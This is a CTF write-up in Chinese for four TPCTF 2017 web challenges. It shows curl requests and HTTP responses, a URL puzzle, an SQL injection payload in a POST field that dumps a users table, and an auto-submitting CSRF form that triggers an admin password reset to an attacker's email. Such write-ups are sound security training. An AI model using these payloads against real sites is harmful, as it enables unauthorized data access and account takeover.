# TPCTF 2017 - Notes

## Methods

依題目名稱來看，用 OPTIONS 看該網站支援那些方法

```
$ curl -v -X OPTIONS http://methods.tpctf.com/problem
*   Trying 216.239.32.21...
* TCP_NODELAY set
* Connected to methods.tpctf.com (216.239.32.21) port 80 (#0)
> OPTIONS /problem HTTP/1.1
> Host: methods.tpctf.com
> User-Agent: curl/7.56.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Allow: OPTIONS, HEAD, DELETE, POST, GET
< Set-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.DQWYlg.AP3EbqS68v2AWoE7qPBxuj-5rfI; Expires=Sun, 03-Dec-2017 14:35:50 GMT; HttpOnly; Path=/
< X-Cloud-Trace-Context: b73375bee7db692185b6dd624ba02a3f
< Date: Sun, 03 Dec 2017 14:15:50 GMT
< Server: Google Frontend
< Content-Length: 0
< Expires: Sun, 03 Dec 2017 14:15:50 GMT
< Cache-Control: private
<
```

把可用的方法拿來試一試
```
$ curl -v -X DELETE http://methods.tpctf.com/problem
*   Trying 216.239.34.21...
* TCP_NODELAY set
* Connected to methods.tpctf.com (216.239.34.21) port 80 (#0)
> DELETE /problem HTTP/1.1
> Host: methods.tpctf.com
> User-Agent: curl/7.56.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Set-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.DQWaPA.Xk9LrL0JCcYytopoPk3-VCWGo8s; Expires=Sun, 03-Dec-2017 14:42:52 GMT; HttpOnly; Path=/
< X-Cloud-Trace-Context: a55967d2441e5de7054f7c098f5f5e18
< Date: Sun, 03 Dec 2017 14:22:52 GMT
< Server: Google Frontend
< Content-Length: 58
< Expires: Sun, 03 Dec 2017 14:22:52 GMT
< Cache-Control: private
<
* Connection #0 to host methods.tpctf.com left intact
Flag: tpctf{so_post_and_get_are_not_the_only_http_methods}
```

## What is this place?
> Description:
> https://repl.it/@clarencelam/caesar-again

打開網址可以看到

![image](https://github.com/solymx/CTF/blob/master/WEB/TPCTF%202017/img/1.png)

右邊的 result 有寫 where is my location ?

所以可以想是 ```window.location.href```

點 result 右邊的 console 

![image](https://github.com/solymx/CTF/blob/master/WEB/TPCTF%202017/img/2.png)

把 https://replit.org/data/web_project/64df16458ba95e01f7f67706af4602ed/index.html 點開

```
what is my location? i think i hid a hex string there

i think i hid a flag at http://tinyurl.com/1st-16-chars-of-the-hex

put text in text box and hit submit
```

打開 http://tinyurl.com/1st-16-chars-of-the-hex 

會看到網址轉成: https://hexed.it/#base64:Zmlyc3QgcGFydCBvZiB0aGUgZmxhZyBpcyB0cGN0Znt3NGk3Xw==

並看到第一個 flag ，那按照上面的提示 前一半 16個字

取 64df16458ba95e01f7f67706af4602ed 前一半

把網址改成: http://tinyurl.com/64df16458ba95e01

可以看到後半段 flag


## Management
> Description:
> I've created a new website so you can do all your important management. It includes users, creating things, reading things, and... well, not much else. Maybe there's a flag?
>
> hint:
![image](https://github.com/solymx/CTF/blob/master/WEB/TPCTF%202017/img/hint.png)


打開網站:
![image](https://github.com/solymx/CTF/blob/master/WEB/TPCTF%202017/img/3.png)

輸入 user1 登進去，並按 Read
![image](https://github.com/solymx/CTF/blob/master/WEB/TPCTF%202017/img/4.png)

然後用 fiddler 看一下，按了 Read 送的內容
```
POST http://web.tpctf.com:8558/ HTTP/1.1
Host: web.tpctf.com:8558
Connection: keep-alive
Content-Length: 27
Cache-Control: max-age=0
Origin: http://web.tpctf.com:8558
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://web.tpctf.com:8558/
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: user=user1

number=1&value=&action=Read
```

那我們來改改 number 的值看看

改 number 的值為 name` FROM users LIMIT 1 OFFSET 0-- -

```
POST http://web.tpctf.com:8558/ HTTP/1.1
Host: web.tpctf.com:8558
Proxy-Connection: keep-alive
Content-Length: 27
Cache-Control: max-age=0
Origin: http://web.tpctf.com:8558
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://web.tpctf.com:8558/
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: user=user1

number=name` FROM users LIMIT 1 OFFSET 0-- -&value=&action=Read
```
看到顯示為:

```
SELECT `name` FROM users LIMIT 1 OFFSET 0-- -` FROM users WHERE name = 'custom-user1';Result: custom-Hi
```

改 number 值為 name` FROM users LIMIT 1 OFFSET 1-- -

可以看到顯示為:
```
SELECT `name` FROM users LIMIT 1 OFFSET 1-- -` FROM users WHERE name = 'custom-user1';Result: flag{aLW4ys_ESC4PE_3v3rYTH1NG!!!!!}
```

## It's Common Sense
> Description:
> We found this site: Common Sense Reviews
> 
> We think the site owners are related to Pirates. Please retrieve the admin password.

點開網站
![image](https://github.com/solymx/CTF/blob/master/WEB/TPCTF%202017/img/5.png)

先註冊後登入，點選 Account 
![image](https://github.com/solymx/CTF/blob/master/WEB/TPCTF%202017/img/6.png)

有兩個功能可以用，第一個表單因為有 http only ，所以不能用 XSS

第二個功能是重置密碼，題目要求的是得到 admin 密碼

看一下重置密碼的 html
```html
<form action="" method="POST" id="newpwd">
                <label>Email</label><br/>
                <input required type="text" name="email" />
                <input type="hidden" value="Send Request" name="formbtn" />
                <input type="submit" value="Send Request" onclick="document.getElementById('newpwd').submit();"/>
</form>
```
將其改成
```html
<form action="/account" method="POST" id="newpwd">
                <label>Email</label><br/>
                <input required type="text" name="email" value="XXX-MAIL@gmail.com"/>
                <input type="hidden" value="Send Request" name="formbtn" />
                <input type="submit" value="Send Request" onclick="document.getElementById('newpwd').submit();"/>
</form>
<script>
document.newpwd.submit();
</script>
```

放到第一個表單送出

等一陣子可以收到e-mail
```
Congratulations! Normally, you would've reset the administrators password. For the purposes of this challenge, the flag is tpctf{D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff}
```
